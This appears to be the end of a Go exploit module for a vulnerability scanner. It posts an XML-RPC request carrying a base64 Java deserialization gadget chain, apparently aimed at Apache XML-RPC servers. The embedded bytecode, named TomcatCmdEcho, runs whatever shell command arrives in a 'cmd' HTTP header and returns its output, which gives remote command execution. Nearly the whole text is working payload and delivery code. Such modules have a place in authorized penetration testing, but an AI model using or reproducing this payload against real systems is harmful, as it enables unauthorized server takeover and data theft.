                        <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAFK/K/rq+AAAAMwEFCgBFAIkKAIoAiwoAigCMCgAdAI0IAHoKABsAjgoAjwCQCgCPAJEHAHsKAIoAkggAkwoAIACUCACVCACWBwCXCACYCABYBwCZCgAbAJoIAJsIAHAHAJwLABYAnQsAFgCeCABnCACfBwCgCgAbAKEHAKIKAKMApAgApQcApggApwoAIACoCACpCQAlAKoHAKsKACUArAgArQoArgCvCgAgALAIALEIALIIALMIALQIALUHALYHALcKADAAuAoAMAC5CgC6ALsKAC8AvAgAvQoALwC+CgAvAL8KACAAwAgAwQoAGwDCCgAbAMMIAMQHAGQKABsAxQgAxgcAxwgAyAgAyQcAygcBAwcAzAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAsTHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvVG9tY2F0Q21kRWNobzsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAzQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBAANjbHMBABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjUBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAAltCAQAJcHJvY2Vzc29yAQASTGphdmEvbGFuZy9PYmplY3Q7AQADcmVxAQAEcmVzcAEAAWoBAAFJAQABdAEAEkxqYXZhL2xhbmcvVGhyZWFkOwEAA3N0cgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA29iagEACnByb2Nlc3NvcnMBABBMamF2YS91dGlsL0xpc3Q7AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABaQEABGZsYWcBAAFaAQAFZ3JvdXABABdMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEAAWYBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsBAA1TdGFja01hcFRhYmxlBwDOBwDPBwDQBwCmBwCiBwCZBwCcBwBiBwDHBwDKAQAKU291cmNlRmlsZQEAElRvbWNhdENtZEVjaG8uamF2YQwARgBHBwDQDADRANIMANMA1AwA1QDWDADXANgHAM8MANkA2gwA2wDcDADdAN4BAARleGVjDADfAOABAARodHRwAQAGdGFyZ2V0AQASamF2YS9sYW5nL1J1bm5hYmxlAQAGdGhpcyQwAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDADhANYBAAZnbG9iYWwBAA5qYXZhL3V0aWwvTGlzdAwA4gDjDADbAOQBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwA5QDmAQAQamF2YS9sYW5nL09iamVjdAcA5wwA6ADpAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwA6gDrAQAJc2V0U3RhdHVzDADsAF4BABFqYXZhL2xhbmcvSW50ZWdlcgwARgDtAQAHb3MubmFtZQcA7gwA7wDwDADxAN4BAAN3aW4BAAdjbWQuZXhlAQACL2MBAAkvYmluL2Jhc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyDABGAPIMAPMA9AcA9QwA9gD3DABGAPgBAAJcQQwA+QD6DAD7AN4MAPwA/QEAJG9yZy5hcGFjaGUudG9tY2F0LnV0aWwuYnVmLkJ5dGVDaHVuawwA/gD/DAEAAQEBAAhzZXRCeXRlcwwBAgDmAQAHZG9Xcml0ZQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAEAE2phdmEvbGFuZy9FeGNlcHRpb24BACp5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL1RvbWNhdENtZEVjaG8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAVamF2YS9sYW5nL1RocmVhZEdyb3VwAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEADWdldFN1cGVyY2xhc3MBAARzaXplAQADKClJAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2lzRW1wdHkBAAMoKVoBAARUWVBFAQAEKEkpVgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9T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</serializable>
                    </value>
                </member>
            </struct>
        </value>
        </param>
    </params>
</methodCall>`
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 {
						expResult.Output = resp.RawBody
						expResult.Success = true
					}
				}
			}

			return expResult
		},
	))
}